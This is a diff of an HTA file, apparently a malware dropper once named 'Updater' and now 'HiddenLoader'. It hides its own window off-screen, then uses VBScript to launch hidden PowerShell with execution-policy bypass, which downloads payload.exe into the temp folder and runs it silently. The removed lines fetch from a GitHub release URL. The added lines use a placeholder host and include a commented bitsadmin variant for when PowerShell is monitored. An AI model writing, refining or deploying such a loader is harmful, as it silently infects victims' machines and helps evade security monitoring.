@@ -1,10 +1,10 @@
 <hta:application
   id="oHTA"
-  applicationname="Updater"
+  applicationname="HiddenLoader"
   border="none"
   caption="no"
   showintaskbar="no"
-  windowstate="minimize"  <!-- Prevents flicker -->
+  windowstate="minimize"
   singleinstance="yes"
   navigable="no"
   sysmenu="no"
@@ -14,14 +14,17 @@
 />
 
 <script language="VBScript">
-  Window.resizeTo 0, 0  <!-- Ensure window is invisible -->
-  Window.moveTo -2000, -2000  <!-- Move off-screen -->
-
+  ' ==== Ensure window never appears ====
+  Window.resizeTo 0, 0
+  Window.moveTo -2000, -2000
   Set objShell = CreateObject("Wscript.Shell")
-  
-  ' Run PowerShell in a completely hidden way
-  objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v7.0/payload.exe';$out='%temp%\payload.exe';(New-Object Net.WebClient).DownloadFile($url, $out);Start-Process -WindowStyle Hidden $out""", 0, False
 
-  ' Close HTA immediately
+  ' ==== Method 1: Direct silent execution (best) ====
+  objShell.Run "cmd /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://example.com/payload.exe';$out='%temp%\payload.exe';Invoke-WebRequest $url -OutFile $out;Start-Process -WindowStyle Hidden $out""", 0, False
+
+  ' ==== Method 2: Alternative (if PowerShell is monitored) ====
+  ' objShell.Run "cmd /c bitsadmin /transfer payload /download /priority high https://example.com/payload.exe %temp%\payload.exe && start /b %temp%\payload.exe", 0, False
+
+  ' ==== Close HTA immediately ====
   Self.Close()
 </script>
